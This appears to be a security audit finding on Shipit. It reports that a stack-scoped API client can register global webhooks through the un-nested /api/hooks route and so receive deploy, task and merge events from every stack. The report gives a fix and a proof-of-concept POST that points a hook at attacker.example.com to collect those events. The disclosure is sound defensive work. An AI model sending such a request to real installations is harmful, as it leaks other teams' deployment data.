### Title
Stack-scoped ApiClient can create/manage global webhooks to intercept events from every other stack - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
An `ApiClient` can be scoped to a single `Stack` via its `stack_id` column, and this scoping is the boundary the token is supposed to authorize (`stack a token authorises`). The `Api::HooksController`, however, only derives `stack_id` from `params[:stack_id]`, which is absent on the top-level, non-nested `/api/hooks` route. When that route is hit, the controller silently falls back to operating on **global** hooks (`stack_id: nil`) instead of enforcing the `ApiClient#stack_id` scope, so any client holding the generic `write:hook`/`read:hook` permission can create, read, update or delete hooks that fire for **every** stack in the installation, not just the one it was authorized for.

### Finding Description
`ApiClient` records can be scoped to one `Stack`: [1](#0-0) 

The base API controller resolves which stacks a client may touch using this scope: [2](#0-1) 

`Stack.from_param!` is only invoked when a `stack` is actually requested. Crucially, `Api::HooksController` computes its own `stack_id` solely from `params[:stack_id]`: [3](#0-2) 

`config/routes.rb` exposes two ways to reach `HooksController`: the stack-nested route (which supplies `stack_id` and thus triggers the `stack.from_param!` check, correctly enforcing `current_api_client.stack_id`) and a top-level, non-nested route with no `stack_id` segment at all: [4](#0-3) 

When the top-level `/api/hooks` route is used, `params[:stack_id]` is never present, so `HooksController#stack_id` returns `nil` without ever calling `stack`/`stacks.from_param!` — the exact code path that would have enforced `current_api_client.stack_id`. As a result `hooks` resolves to `Hook.where(stack_id: nil)`, i.e. **global** hooks: [5](#0-4) 

Global hooks (`stack_id: nil`) are delivered for events on *every* stack, because `Hook.deliver` matches `stack_id: [nil, stack_id]`: [6](#0-5) 

The only authorization gate on this controller is a permission-string check (`write:hook`/`read:hook`) that is completely independent of the client's `stack_id` scope: [7](#0-6) [8](#0-7) 

The binding that is broken is: **stack a token authorises == stack it touches**. Before the attacker acts, a stack-scoped `ApiClient` (e.g. `stack: shipit`, holding `write:hook`) is only supposed to be able to read/write hooks for its own stack (as demonstrated by `here_come_the_walrus` fixture, restricted via `stacks.from_param!`). After hitting the un-nested `/api/hooks` endpoint, the same client can create/modify/destroy a global `Hook` object whose `delivery_url`/`events` apply to `stack`, `review_stack`, `task`, `deploy`, `rollback`, `lock`, `commit_status`, `deployable_status`, `merge_status`, `merge`, and `pull_request` events across **all** stacks in the Shipit installation.

### Impact Explanation
An attacker who only legitimately controls an `ApiClient` scoped to one, low-value stack can register (or hijack, via `update`) a global hook pointed at an attacker-controlled URL, and start receiving `deploy`, `task`, `merge`, and `pull_request` event payloads for every other stack managed by the Shipit instance — including stacks belonging to different repositories/teams they have no read access to. This satisfies the "High" bar of "unauthenticated read of stack state, task streams or deploy output," because it escalates beyond the stack the ApiClient token was scoped to, and can also be used to *destroy* other stacks' legitimate global hooks (integrity impact on notification/CI integrations shared by unrelated stacks).

### Likelihood Explanation
Any actor who has been issued (or otherwise obtains) an `ApiClient` token restricted to a single stack via `write:hook`/`read:hook` — a routine grant for CI integrations — can exploit this without any additional privilege. The only requirement is knowledge of the un-nested `/api/hooks` route, which is a standard, documented route in `config/routes.rb` and not hidden or feature-flagged.

### Recommendation
`Api::HooksController#stack_id`/`#hooks` should reject or scope hook management by the authenticated client's own `ApiClient#stack_id` (when present) regardless of whether `params[:stack_id]` was supplied, e.g.:
```ruby
def stack_id
  return current_api_client.stack_id if current_api_client.stack_id?
  stack.id if params[:stack_id].present?
end
```
and/or disallow scoped clients from ever reaching `Hook.global` scope, raising `ApiClient::InsufficientPermission` if a stack-scoped client attempts to access the un-nested `/api/hooks` collection.

### Proof of Concept
1. Admin issues an `ApiClient` scoped to `Stack A` with permissions `['read:hook', 'write:hook']` (a routine grant intended only to let the CI for Stack A manage its own webhook).
2. Attacker (holder of that token) sends:
```
POST /api/hooks
Authorization: Basic <base64(token)>
Content-Type: application/json

{"delivery_url": "https://attacker.example.com/collect", "events": ["deploy", "task", "merge_request"]}
```
(no `stack_id` in the path — this hits the top-level route in `config/routes.rb` line 46, not the nested one at line 43).
3. `Api::HooksController#create` executes `hooks.create(params)` where `hooks` resolves to `Hook.where(stack_id: nil)` since `params[:stack_id]` is absent — creating a **global** `Hook` unconstrained by `current_api_client.stack_id`.
4. From then on, every `deploy`, `task`, and `merge_request` event for **every** stack in the installation (not just Stack A) is POSTed to `https://attacker.example.com/collect`, confirmed by `Hook.deliver`'s `for_stack(stack_id) → where(stack_id: [nil, stack_id])` matching logic.

    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
